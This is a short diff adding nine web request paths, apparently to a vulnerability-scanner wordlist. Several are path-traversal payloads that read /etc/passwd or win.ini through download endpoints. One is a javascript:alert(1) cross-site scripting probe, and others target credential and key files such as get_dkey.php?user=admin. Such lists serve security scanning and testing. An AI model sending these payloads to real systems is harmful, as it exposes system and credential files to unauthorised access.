@@ -1,0 +1,9 @@
+/common/download/resource?resource=/profile/../../../../etc/passwd
+/common/download/resource?resource=/profile/../../../../Windows/win.ini
+/authenticationserverservlet
+/get_dkey.php?user=admin
+/e/ViewImg/index.html?url=javascript:alert(1)
+/web/xml/webuser-auth.xml
+/api/dp/rptsvcsyncpoint?ccid=1
+/view/action/download_file.php?filename=../../../../../../../../../etc/passwd&savename={{filename}}.txt
+/webui/?g=sys_dia_data_down&file_name=../etc/passwd
